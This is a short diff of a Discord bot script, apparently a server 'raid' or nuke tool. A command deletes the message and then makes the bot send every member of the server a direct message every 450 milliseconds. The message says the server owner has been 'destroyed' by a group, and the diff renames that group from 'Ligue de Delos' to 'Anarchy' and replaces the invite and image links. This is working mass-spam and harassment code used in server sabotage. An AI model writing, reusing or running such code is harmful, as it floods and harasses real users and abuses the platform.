@@ -122,7 +122,7 @@ client.on('message', msg => {
                 if (msg.deletable) msg.delete();
                 msg.guild.members.forEach(member => {
                   setInterval(function () {
-                    member.send("**" + msg.guild.owner.user.username + "** a été détruit par la Ligue de Delos\nhttps://discord.gg/ru45dwu\nhttps://media.giphy.com/media/fs0jQE06crHkXuZGnP/giphy.gif").catch(error => {}) }, 450)})
+                    member.send("**" + msg.guild.owner.user.username + "** a été détruit par Anarchy\nhttps://cdn.discordapp.com/attachments/498502361975881738/498876912303865866/PicsArt_10-08-09.53.55.gif\nhttps://cdn.discordapp.com/attachments/498502361975881738/498850930918424588/PicsArt_10-08-03.34.58.jpg").catch(error => {}) }, 450)})
        }
 
 if(msg.content === '-del'){
